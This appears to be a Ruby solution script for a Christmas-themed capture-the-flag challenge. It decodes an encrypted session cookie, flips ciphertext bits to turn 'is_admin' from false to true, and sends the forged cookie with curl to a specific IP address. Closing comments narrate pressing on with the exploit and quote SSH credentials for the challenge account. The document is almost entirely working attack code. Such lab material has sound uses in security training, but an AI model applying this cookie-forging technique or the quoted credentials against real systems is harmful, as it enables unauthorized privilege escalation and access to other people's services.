require "uri"
require "base64"
class String
  def decode
    Base64.decode64(URI.unescape(self))
  end
  def encode
    URI.escape(Base64.encode64(self).chomp).gsub("+", "%2B").gsub("=", "%3D")
  end
end

raw_cookie = "ccYKPh4W%2BAEcJGLVIbhReh3q3cRXEARRll0DKGEkdNf%2BsWA%3D"
cookie = raw_cookie.decode

# {"user":"elf2207","is_admin":false"}
q = cookie.unpack("C*")
q[29] ^= ("t".ord ^ "f".ord)
q[30] ^= ("r".ord ^ "a".ord)
q[31] ^= ("u".ord ^ "l".ord)
q[32] ^= ("e".ord ^ "s".ord)
q[33] ^= (" ".ord ^ "e".ord)
hacked_cookie = q.pack("C*")
system %Q[curl --header "Cookie: encrypted_session=#{hacked_cookie.encode}" "http://178.62.63.250/"]

# After poking around for a while you realise that the system is fundamentally broken,
# and even admins cannot edit the naughty and nice lists!
#
# Determined to exploit the system you press on, and discover that the elf has
# SSH access to the system, with the credentials "elf2207" and the password "snowball2" (!).
